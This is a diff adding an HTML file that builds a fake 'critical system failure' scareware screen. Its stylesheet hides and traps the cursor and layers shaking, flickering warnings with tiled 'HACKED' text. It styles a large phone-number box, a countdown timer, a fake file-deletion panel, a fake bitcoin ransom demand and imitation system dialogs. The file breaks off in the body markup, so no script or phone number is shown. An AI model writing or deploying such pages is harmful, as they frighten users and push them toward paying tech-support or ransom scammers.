@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>!!! CRITICAL SYSTEM FAILURE !!!</title>
+    <style type="text/css">
+        /* COMPLETE VISUAL DOMINATION */
+        * {
+            margin: 0 !important;
+            padding: 0 !important;
+            box-sizing: border-box !important;
+            -webkit-user-drag: none !important;
+            -webkit-appearance: none !important;
+        }
+        
+        html, body {
+            width: 100vw !important;
+            height: 100vh !important;
+            overflow: hidden !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            background: #000 !important;
+            cursor: none !important;
+        }
+        
+        /* CURSOR ERADICATION SYSTEM */
+        *:hover, *:active, *:focus {
+            cursor: none !important;
+        }
+        
+        /* Force cursor hiding on all elements */
+        body::after {
+            content: '' !important;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            pointer-events: none !important;
+            z-index: 2147483647 !important;
+            cursor: none !important;
+        }
+        
+        /* FAKE CURSOR THAT FOLLOWS REAL CURSOR BUT IS ALWAYS VISIBLE */
+        #fakeCursor {
+            position: fixed !important;
+            width: 20px !important;
+            height: 20px !important;
+            background: #ff0000 !important;
+            border-radius: 50% !important;
+            pointer-events: none !important;
+            z-index: 2147483646 !important;
+            mix-blend-mode: difference !important;
+            animation: cursorPulse 0.5s infinite !important;
+            display: none !important;
+        }
+        
+        @keyframes cursorPulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+        }
+        
+        /* MAIN OVERLAY - CONSTANTLY MOVING AND SHAKING */
+        .overlay {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            background: #000 !important;
+            z-index: 999999 !important;
+            display: flex !important;
+            justify-content: center !important;
+            align-items: center !important;
+            animation: 
+                shake 0.3s infinite,
+                colorShift 2s infinite,
+                flicker 0.1s infinite !important;
+            cursor: none !important;
+        }
+        
+        /* MULTIPLE WARNING LAYERS */
+        .warning-layer-1, .warning-layer-2, .warning-layer-3 {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100vw !important;
+            height: 100vh !important;
+            pointer-events: none !important;
+            z-index: 999998 !important;
+            opacity: 0.7 !important;
+            mix-blend-mode: screen !important;
+        }
+        
+        .warning-layer-1 {
+            background: radial-gradient(circle, transparent 20%, #ff0000 100%) !important;
+            animation: rotate 20s linear infinite !important;
+        }
+        
+        .warning-layer-2 {
+            background: repeating-linear-gradient(
+                45deg,
+                transparent,
+                transparent 10px,
+                #00ff00 10px,
+                #00ff00 20px
+            ) !important;
+            animation: rotateReverse 15s linear infinite !important;
+        }
+        
+        .warning-layer-3 {
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="50" font-family="Arial" font-size="20" fill="white">HACKED</text></svg>') repeat !important;
+            animation: scroll 10s linear infinite !important;
+        }
+        
+        /* WARNING BOX WITH MULTIPLE BORDERS */
+        .warning-box {
+            background: #000 !important;
+            width: 90vw !important;
+            max-width: 1000px !important;
+            padding: 50px !important;
+            border: 20px solid #ff0000 !important;
+            outline: 10px solid #00ff00 !important;
+            box-shadow: 
+                0 0 100px #ff0000,
+                0 0 200px #00ff00,
+                0 0 300px #0000ff,
+                inset 0 0 100px #ff0000 !important;
+            position: relative !important;
+            z-index: 1000000 !important;
+            animation: 
+                borderPulse 1s infinite,
+                float 3s ease-in-out infinite !important;
+            cursor: none !important;
+        }
+        
+        .warning-box::before, .warning-box::after {
+            content: '⚠️' !important;
+            position: absolute !important;
+            font-size: 100px !important;
+            animation: spin 2s linear infinite !important;
+        }
+        
+        .warning-box::before {
+            top: -50px !important;
+            left: -50px !important;
+        }
+        
+        .warning-box::after {
+            bottom: -50px !important;
+            right: -50px !important;
+        }
+        
+        /* HEADER WITH GLITCH EFFECT */
+        .header {
+            color: #fff !important;
+            font-size: 48px !important;
+            text-align: center !important;
+            margin-bottom: 40px !important;
+            text-transform: uppercase !important;
+            letter-spacing: 5px !important;
+            text-shadow: 
+                0 0 10px #ff0000,
+                0 0 20px #ff0000,
+                0 0 30px #ff0000 !important;
+            animation: glitch 0.5s infinite !important;
+            position: relative !important;
+        }
+        
+        .header::before, .header::after {
+            content: attr(data-text) !important;
+            position: absolute !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+        }
+        
+        .header::before {
+            color: #00ff00 !important;
+            animation: glitch-top 1s infinite !important;
+            clip-path: polygon(0 0, 100% 0, 100% 33%, 0 33%) !important;
+        }
+        
+        .header::after {
+            color: #0000ff !important;
+            animation: glitch-bottom 1.5s infinite !important;
+            clip-path: polygon(0 67%, 100% 67%, 100% 100%, 0 100%) !important;
+        }
+        
+        /* CONTENT AREA */
+        .content {
+            color: #fff !important;
+            font-size: 28px !important;
+            line-height: 1.6 !important;
+            text-align: center !important;
+            margin: 30px 0 !important;
+            text-shadow: 0 0 5px #fff !important;
+        }
+        
+        /* CRITICAL ALERT TEXT */
+        .alert {
+            color: #ff0000 !important;
+            font-size: 36px !important;
+            font-weight: bold !important;
+            margin: 25px 0 !important;
+            animation: blink 0.3s infinite, shakeSmall 0.2s infinite !important;
+            text-transform: uppercase !important;
+        }
+        
+        /* PHONE NUMBER - IMPOSSIBLE TO MISS */
+        .call {
+            font-size: 72px !important;
+            color: #fff !important;
+            background: linear-gradient(45deg, #ff0000, #0000ff) !important;
+            padding: 40px !important;
+            margin: 40px 0 !important;
+            border: 10px solid #fff !important;
+            text-shadow: 0 0 20px #000 !important;
+            animation: 
+                numberPulse 0.5s infinite,
+                rainbow 2s linear infinite !important;
+            position: relative !important;
+            overflow: hidden !important;
+        }
+        
+        .call::before {
+            content: '' !important;
+            position: absolute !important;
+            top: -50% !important;
+            left: -50% !important;
+            width: 200% !important;
+            height: 200% !important;
+            background: linear-gradient(
+                45deg,
+                transparent,
+                rgba(255,255,255,0.1),
+                transparent
+            ) !important;
+            animation: shine 3s infinite !important;
+        }
+        
+        /* COUNTDOWN TIMER */
+        .countdown {
+            font-size: 42px !important;
+            color: #ff0000 !important;
+            margin: 30px 0 !important;
+            font-family: 'Courier New', monospace !important;
+            background: #000 !important;
+            padding: 20px !important;
+            border: 5px solid #ff0000 !important;
+            display: inline-block !important;
+            animation: countdownPulse 1s infinite !important;
+        }
+        
+        /* FAKE FILE DELETION ANIMATION */
+        .file-deletion {
+            position: fixed !important;
+            bottom: 20px !important;
+            left: 20px !important;
+            background: #000 !important;
+            color: #ff0000 !important;
+            border: 2px solid #ff0000 !important;
+            padding: 10px !important;
+            font-family: 'Courier New', monospace !important;
+            font-size: 14px !important;
+            z-index: 1000001 !important;
+            width: 300px !important;
+            height: 200px !important;
+            overflow: hidden !important;
+            display: none !important;
+        }
+        
+        /* FAKE BITCOIN DEMAND */
+        .bitcoin-demand {
+            position: fixed !important;
+            top: 20px !important;
+            right: 20px !important;
+            background: #000 !important;
+            color: #ff9900 !important;
+            border: 2px solid #ff9900 !important;
+            padding: 15px !important;
+            font-family: 'Courier New', monospace !important;
+            z-index: 1000001 !important;
+            display: none !important;
+            animation: shake 0.5s infinite !important;
+        }
+        
+        /* FAKE SYSTEM DIALOGS */
+        .fake-dialog {
+            position: fixed !important;
+            background: #c0c0c0 !important;
+            border: 2px solid #000 !important;
+            font-family: 'MS Sans Serif', sans-serif !important;
+            z-index: 1000002 !important;
+            display: none !important;
+            box-shadow: 5px 5px 0 rgba(0,0,0,0.2) !important;
+        }
+        
+        /* ANIMATIONS */
+        @keyframes shake {
+            0%, 100% { transform: translate(0, 0) rotate(0deg); }
+            10%, 30%, 50%, 70%, 90% { transform: translate(-10px, -10px) rotate(-1deg); }
+            20%, 40%, 60%, 80% { transform: translate(10px, 10px) rotate(1deg); }
+        }
+        
+        @keyframes shakeSmall {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.1; }
+        }
+        
+        @keyframes colorShift {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+        
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+        
+        @keyframes borderPulse {
+            0%, 100% { border-color: #ff0000; outline-color: #00ff00; }
+            50% { border-color: #00ff00; outline-color: #ff0000; }
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes rotateReverse {
+            0% { transform: rotate(360deg); }
+            100% { transform: rotate(0deg); }
+        }
+        
+        @keyframes scroll {
+            0% { background-position: 0 0; }
+            100% { background-position: 100px 100px; }
+        }
+        
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+        
+        @keyframes glitch-top {
+            0%, 100% { transform: translate(0); }
+            50% { transform: translate(-5px, -3px); }
+        }
+        
+        @keyframes glitch-bottom {
+            0%, 100% { transform: translate(0); }
+            50% { transform: translate(5px, 3px); }
+        }
+        
+        @keyframes numberPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        @keyframes rainbow {
+            0% { filter: hue-rotate(0deg); }
+            100% { filter: hue-rotate(360deg); }
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        @keyframes countdownPulse {
+            0%, 100% { box-shadow: 0 0 20px #ff0000; }
+            50% { box-shadow: 0 0 40px #ff0000; }
+        }
+        
+        /* HIDE SCROLLBARS */
+        ::-webkit-scrollbar {
+            display: none !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
+    </style>
+</head>
+<body>
+    <!-- CURSOR TRAP LAYER -->
+    <div id="cursorTrap" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 2147483647; pointer-events: none; cursor: none !important;"></div>
+    
+    <!-- FAKE CURSOR -->
+    <div id="fakeCursor"></div>
+    
+    <!-- VISUAL EFFECT LAYERS -->
+    <div class="warning-layer-1"></div>
+    <div class="warning-layer-2"></div>
+    <div class="warning-layer-3"></div>
+    
+    <!-- MAIN WARNING -->
+    <div class="overlay" id="mainOverlay">
+        <div class="warning-box">
+            <div class="
